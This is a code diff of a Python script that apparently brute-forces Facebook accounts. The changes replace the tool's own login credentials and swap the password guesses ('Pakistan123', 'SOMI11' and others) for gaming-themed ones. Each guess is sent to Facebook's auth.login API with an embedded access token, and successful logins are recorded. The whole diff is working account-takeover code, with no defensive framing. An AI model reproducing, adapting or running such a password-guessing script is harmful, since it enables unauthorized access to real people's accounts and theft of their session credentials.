@@ -195,8 +195,8 @@ logo2 = """
                                                 
 \033[1;97m---------------------SOMI--------------------
 """
-CorrectUsername = "Somi"
-CorrectPassword = "Awan"
+CorrectUsername = "zf"
+CorrectPassword = "zf"
 
 loop = 'true'
 while (loop == 'true'):
@@ -334,7 +334,7 @@ def action():
                             cps.close()
                             cpb.append(c+user+pass2)
                         else:
-                            pass3="Pakistan123"
+                            pass3="Freefireking"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
@@ -351,7 +351,7 @@ def action():
                                     cps.close()
                                     cpb.append(c+user+pass3)
                                 else:
-                                    pass4="SOMI11"
+                                    pass4="Freefire"
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
@@ -368,7 +368,7 @@ def action():
                                             cps.close()
                                             cpb.append(c+user+pass4)
                                         else:
-                                            pass5="786786"
+                                            pass5="Freefirelover"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
